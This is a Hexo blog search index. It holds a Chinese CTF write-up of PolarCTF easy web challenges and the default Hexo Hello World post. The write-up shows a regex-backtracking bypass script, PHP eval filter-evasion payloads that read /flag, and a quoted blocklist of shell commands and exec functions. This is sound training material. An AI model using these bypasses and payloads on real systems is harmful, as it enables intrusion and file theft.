<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>polar_web_easy</title>
    <link href="/2025/12/31/polar-web-easy/"/>
    <url>/2025/12/31/polar-web-easy/</url>
    
    <content type="html"><![CDATA[<h2 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h2><blockquote><p>考查点：preg_match 回溯绕过</p></blockquote><p>看到题目名称，感觉有些奇怪，访问环境页面同样给出提示：<code>true .swp file?</code></p><p>我们可以搜索一下 <strong>web swp文件</strong></p><blockquote><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp</p></blockquote><p>由此推断该题应该是有一个以 <strong>.swp</strong> 为结尾的路径，我们使用 <strong>dirsearch</strong> 扫描一下</p><p><img src="/2025/12/31/polar-web-easy/1-1.png"></p><p>我们可以看到的确有一个这样的路径：<code>/.index.php.swp</code></p><p>访问该路径得到一段源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jiuzhe</span>(<span class="hljs-params"><span class="hljs-variable">$xdmtql</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>);<br>&#125;<br><br><span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">jiuzhe</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;*******&#125;&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true .swp file?&#x27;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nijilenijile&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们对源码进行分析，首先是自定义函数 <code>jiuzhe</code></p><blockquote><p><code>preg_match</code> 函数是一个正则表达式匹配函数，在找到第一个匹配后即停止搜索，返回值只可能是 <strong>1（匹配成功）</strong>、<strong>0（未匹配）</strong> 或 <strong>false（出错）</strong></p></blockquote><p>我们可以通过<a href="https://www.jyshare.com/front-end/7625/#!flags=&re=^(a|b)*%3F%24">正则表达式可视化工具</a>看看</p><p><img src="/2025/12/31/polar-web-easy/1-2.png"></p><p><code>preg_match</code> <strong>匹配部分</strong>：</p><ul><li><code>sys</code>：匹配字符 “sys”</li><li><code>.*</code>：匹配任意字符（除了换行符）0次或多次</li><li><code>nb</code>：匹配字符 “nb”</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>]<br><span class="hljs-comment"># 此处需要我们以POST方式传入一个名为xdmtql的参数</span><br></code></pre></td></tr></table></figure><p>当我们传入后首先会经过 <code>if(!is_array($xdmtql))</code>，也就是说我们输入的值<strong>不能是数组</strong>类型</p><blockquote><p><strong>is_array</strong> 函数用于检测变量是否为数组，如果是数组则返回 true，否则返回 false</p></blockquote><p>接着会经过自定义函数 <code>jiuzhe</code>，按照当前逻辑，当我们的输入与 <code>preg_match</code> 部分不匹配时，才能进入 <code>strpos</code> 判断</p><blockquote><p><strong>strpos</strong> 函数用于<strong>查找一个字符串在另一个字符串中首次出现的位置</strong>（区分大小写），返回位置索引（从0开始），如果未找到则返回 false</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>此处需要我们的输入中有 <code>sys nb</code> 这样一个字符串，这与上面 <code>preg_match</code> 相悖</p><p>此时我们需要想想其他方法，也就是 <code>preg_match</code> 回溯绕过</p><blockquote><p>在使用 <strong>preg_match</strong> 时，如果正则表达式的回溯次数超过了 PHP 的默认上限（通常为1000000次），preg_match 将返回 false，而不是 1 或 0</p></blockquote><p>这样我们就可以绕过得到 flag</p><p>此处我们需要写一个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># preg_match()的回溯次数默认是1000000次(中英文次数不同, 实测回溯为100w次)</span><br>import requests<br><br>result = requests.<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&quot;http://a498f76a-f934-4ec6-8ef5-464431392be0.www.polarctf.com:8090/&quot;</span>,<br>                       data=&#123;<span class="hljs-string">&quot;xdmtql&quot;</span>:<span class="hljs-string">&quot;sys nb&quot;</span>+<span class="hljs-string">&quot;aa&quot;</span>*<span class="hljs-number">1000000</span>&#125;)<br><span class="hljs-keyword">print</span>(result.text)<br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/1-3.png"></p><h2 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h2><blockquote><p>考查点：命令执行rce</p></blockquote><p>由题目可以知道此题考查的是命令执行rce，下面是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PolarD&amp;N CTF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">no</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="hljs-variable">$txt</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$txt</span>;&#125;<br>   <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;<br><span class="hljs-variable">$yyds</span>=(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yyds&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="hljs-variable">$yyds</span>==<span class="hljs-string">&#x27;666&#x27;</span>)&#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">no</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>]));<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从源码中可以看到定义了一个函数 no，其中对输入进行了过滤，也就是说我们在传参进行命令执行时没法使用这些命令和函数</p><blockquote><p>文件读取命令过滤：<code>cat</code>、<code>more</code>、<code>less</code>、<code>head</code>、<code>tac</code>、<code>tail</code>、<code>nl</code>、<code>od</code>、<code>vim</code>、<code>uniq</code></p><p>命令执行函数过滤：<code>system</code>、<code>proc_open</code>、<code>shell_exec</code>、<code>popen</code></p><p>注意：最后有<code>空格</code>过滤</p></blockquote><p>当我们传入上述这些命令或函数时，就会回显<code>what&#39;s up</code></p><p>往下看发现有<code>$_POST[&#39;yyds&#39;]</code>，需要我们以 <strong>post</strong> 方式传入参数 <strong>yyds</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="hljs-variable">$yyds</span>==<span class="hljs-string">&#x27;666&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>isset</strong> 函数的作用是检测变量是否已设置且值不为 <strong>NULL</strong></p><p>上面的判断要求我们必须以 GET 方式传入一个参数 sys，有没有值都可以；还要求以 POST 方式传入的参数 yyds 值为 666。若传入的参数不对或sys参数不存在，就会回显 <strong>nonono</strong></p><p>当传入正确的参数后，我们看到有 <code>eval</code> 函数供我们进行命令执行，且要通过参数 sys 传入，同时需要绕过 <code>preg_match</code> 过滤</p><blockquote><p>注意：PHP中eval函数与linux中不同，linux中可以直接使用<code>eval ls</code>，但PHP中不行，需要使用一些命令执行函数，如：<code>system</code>、<code>exec</code>等</p></blockquote><p>虽然说 ctf 比赛中常常会将flag放到根目录<code>/</code>下，但万一没按套路出题呢，所以还是一步一步来，先看看当前目录下有没有，然后再看<code>/</code>有没有</p><p>有时会直接以<code>flag.*</code>为文件名，有时会直接是 flag 没有后缀，如果出题人想制造难题，就会将flag文件名设置成一些奇怪的内容，这需要我们自行判断</p><p>经过上述分析，我们先尝试查看当前在哪个目录，该目录下是否存在flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload1:<br>GET:sys=<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload2:<br>GET:sys=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-2.png"></p><p>可以看到当前目录下并没有，此时我们看看<code>/</code>是否会有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload3:<br>GET:sys=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;../../&#x27;</span>));<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-3.png"></p><p>可以看到flag果然在其中，文件名为<code>flag</code></p><p>既然知道了flag位置，现在要做的就是绕过上述的过滤去进行读取</p><p>①、使用PHP内置函数读取文件内容并输出，例如：<code>readfile()</code>、<code>file_get_contents()</code>、<code>highlight_file()</code>、<code>show_source()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload4:<br>GET:sys=<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-4.png"></p><p><img src="/2025/12/31/polar-web-easy/2-5.png"></p><p><img src="/2025/12/31/polar-web-easy/2-6.png"></p><p>②、使用 <code>fopen/fread</code> 读取（更通用的文件读取流程）</p><blockquote><p>该写法没有空格，首先用 <code>fopen</code> 打开，再用 <code>fread</code> 读取指定长度并 <code>echo</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload5:<br>GET:sys=<span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$f</span>,<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)));<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-7.png"></p><p>③、通过可变函数名&#x2F;变量函数绕过字符串检测</p><blockquote><p>把函数名放进字符串&#x2F;变量再调用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">payload6:<br>GET:sys=<span class="hljs-variable">$g</span>=<span class="hljs-string">&#x27;file_get_contents&#x27;</span>;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$g</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>));<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-8.png"></p><p>④、<code>include/require</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">payload7:<br>GET:sys=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag&#x27;</span>);<br>POST:yyds=<span class="hljs-number">666</span><br><span class="hljs-keyword">or</span><br>GET:sys=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;flag&#x27;</span>);<br>POST:yyds=<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><p><img src="/2025/12/31/polar-web-easy/2-9.png"></p><h2 id="蜜雪冰城吉警店"><a href="#蜜雪冰城吉警店" class="headerlink" title="蜜雪冰城吉警店"></a>蜜雪冰城吉警店</h2><blockquote><p>考查点：前端绕过，修改前端数据</p></blockquote><p><img src="/2025/12/31/polar-web-easy/3-1.png"></p><p>打开环境访问，页面中提示</p><p><code>点到第9个隐藏款奶茶的单子，就会给你**flag** ^^</code></p><p>可我们可以看到当前页面上只有 8 个按钮，查看源码也是只有id 1~8，没有发现第 9 个按钮</p><p><img src="/2025/12/31/polar-web-easy/3-2.png"></p><p>那么我们该如何去思考呢？</p><p>其实题目环境下方给出了一些提示：<code>*Written by* 不会写前端的ShawRoot</code></p><p>由此我们推断，此题可以通过修改前端信息获取 flag</p><p>当前页面有1~8，但需要的是 9，那么我们就将其中任意一个改为 9 即可，例如，我将id为1的按钮的id改为9，然后点击第一个按钮即可获得 flag</p><p><img src="/2025/12/31/polar-web-easy/3-3.png"></p><p><img src="/2025/12/31/polar-web-easy/3-4.png"></p><h2 id="召唤神龙"><a href="#召唤神龙" class="headerlink" title="召唤神龙"></a>召唤神龙</h2>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/12/15/hello-world/"/>
    <url>/2025/12/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
